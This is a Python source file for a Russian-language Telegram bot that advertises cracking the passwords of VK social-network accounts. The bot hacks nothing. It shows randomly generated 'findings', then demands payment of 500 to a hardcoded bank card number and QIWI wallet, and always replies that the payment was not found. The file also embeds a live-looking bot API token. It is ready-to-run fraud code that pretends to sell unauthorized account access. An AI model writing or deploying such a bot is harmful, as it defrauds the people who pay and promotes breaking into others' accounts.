# -*- coding: utf-8 -*-
import telebot
from telebot import types
import random
from random import randint
import time
import os
import requests
from requests import get


bot = telebot.TeleBot("5117854848:AAGAmHdGjZAvLyP5_4X4aPtBr6IHvvy2kJE")

List = ["https://i.ibb.co/tsGQGzk/1.jpg", "https://i.ibb.co/bPLkqQY/2.jpg", "https://i.ibb.co/c6qT0M8/3.jpg"]

#приветствие бота
@bot.message_handler(commands=['start'])
def start_message(message):
    markup_reply = telebot.types.InlineKeyboardMarkup()
    markup_reply.add(telebot.types.InlineKeyboardButton(text='❤️‍🔥 Попробовать', callback_data=1))
    bot.send_photo(message.chat.id, get(f"https://i.ibb.co/Z2bHR7q/hacker-5151533-340.jpg").content, caption = "<b>🤖 Привет! Я - Бот, который позволяет узнать пароль от страницы VK.\n\n❕ Но есть одно условие - у пользователя не должна быть подключена двухфакторная аутентификация.</b>\n\n<b>👇🏻 Нажимай на кнопочку снизу!</b>", parse_mode='html', reply_markup=markup_reply) 



# обработка callback клавиатуры
@bot.callback_query_handler(func=lambda call: True)
def KeyboardInline(call):
    if call.data == '1':
        call = bot.send_message(call.message.chat.id, "<b>Что бы узнать пароль от страницы, отправьте ссылку на любого пользователя ВК</b>\n<code>Формат: vk.com/...</code>", parse_mode='html') 
        bot.register_next_step_handler(call, process_link_step)

    elif call.data == '2':
        bot.send_message(call.message.chat.id, "♻️ Секунду, формируем ваш запрос!")
        time.sleep(5)
        random_zakaz = random.randint(5001, 9999)
        Spisok = ["a", "b", "c", "d", "e", "f", "g", "h", "j", "z", "m"]
        Spisok_Big = ["A", "B", "C", "D", "E", "F", "G", "H", "J", "Z", "M"]
        Spisok_Number = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"]
        comment = random.choice(Spisok) + random.choice(Spisok_Big) + random.choice(Spisok_Number)
        comment1 = random.choice(Spisok) + random.choice(Spisok_Big) + random.choice(Spisok_Number)
        commentariy = comment + comment1
        markup_reply = telebot.types.InlineKeyboardMarkup()
        markup_reply.add(telebot.types.InlineKeyboardButton(text='♻️ Я оплатил', callback_data=3))
        markup_reply.add(telebot.types.InlineKeyboardButton(text='❌ Отказаться от оплаты', callback_data=4))

        bot.send_message(call.message.chat.id, f"✅ <b>Ваш заказ был успешно сформирован.</b>\n\n🆔 <b>ID заказа</b>: <i>{random_zakaz}</i>\n<b>💰 Цена:</b> <i>500</i>\n💳 <b>Номер карты:</b> <i>4890 4947 3261 6792</i>\n<b>🥝 QIWI кошелёк</b>: <i>+79672449984</i>\n💬 <b>Комментарий к QIWI:</b> <i>{commentariy}</i>\n\n📝 <code>Для того, что бы оплатить данные, вам нужно перевести ТОЧНО указанную сумму, на QIWI кошелёк или номер карты.</code>\n❕ <code>Учтите, что при переводе на QIWI кошелёк, комментарий обязателен, без него платёж анулируется.</code>\n📌<code>При переводе на карту, комментарий не обязателен.</code>\n\n❕ <b>После успешной оплаты, нажмите на кнопку 'Я оплатил'</b>", parse_mode='html', reply_markup=markup_reply)
   

    elif call.data == '3':
        bot.send_message(call.message.chat.id, "❗️ Платёж не был найден. Попробуйте ещё раз через 10 секунд.")

    elif call.data == '4':
        bot.send_message(call.message.chat.id, f"♻️ Секунду, отменяем ваш заказ!")
        time.sleep(3)
        bot.send_message(call.message.chat.id, "Заказ успешно отменён! Вы в главном меню.")

        markup_reply = telebot.types.InlineKeyboardMarkup()
        markup_reply.add(telebot.types.InlineKeyboardButton(text='❤️‍🔥 Попробовать', callback_data=1)) 

        bot.send_message(call.message.chat.id, "<b>Привет! Я - Бот, который позволяет узнать пароль от страницы VK\n\nНо есть одно условие - у пользователя не должна быть подключена двухфакторная аутентификация.</b>\n\n<b>Нажимай на кнопочку снизу!</b>\n<i>Спасибо, что заглянул ко мне :)</i>", parse_mode='html', reply_markup=markup_reply)




#обработка линка на вк/инст
def process_link_step(message):
    link = message.text

    if link == "vk.com/" or link == "https://vk.com/":
        markup_reply = telebot.types.InlineKeyboardMarkup()
        markup_reply.add(telebot.types.InlineKeyboardButton(text='❤️‍🔥 Попробовать', callback_data=1))

        bot.send_message(message.chat.id, "Ссылка введена не верно! Попробуйте ещё раз.", reply_markup=markup_reply)


    elif link[:7] == 'vk.com/' or link[:16] == 'https://vk.com/':
        bot.send_video(message.chat.id, "https://i.ibb.co/8zG2vDm/d3.gif", caption = "♻️ Обрабатываю отправленную страницу...\n❕ Подождите несколько секунд.")
        random_god = random.randint(2021, 2022)
        random_photo = random.randint(8, 20)
        random_video = random.randint(1, 7)
        random_dialog = random.randint(1, 3)
        time.sleep(3)
        markup_reply = telebot.types.InlineKeyboardMarkup()
        markup_reply.add(telebot.types.InlineKeyboardButton(text='💳 Оплатить взлом', callback_data=2))
        random_vk = random.randint(0, 2)
        bot.send_photo(message.chat.id, get(f"" + List[random_vk]).content, caption = f"✅ Введённая ссылка: {link}\n<b>❕ Страница была проверена, и я смог обнаружить пароль.</b>\n\n⏳ <b>Была обнаружена смена пароля за:</b> <i>{random_god} год. </i>\n\n<code>❕ Вы можете приобрести найденный пароль, нажав на кнопку снизу.</code>", parse_mode='html', reply_markup=markup_reply)



    else:
        markup_reply = telebot.types.InlineKeyboardMarkup()
        markup_reply.add(telebot.types.InlineKeyboardButton(text='❤️‍🔥 Попробовать', callback_data=1))

        bot.send_message(message.chat.id, "Ссылка введена не верно! Попробуйте ещё раз.", reply_markup=markup_reply)




bot.polling(none_stop=True)
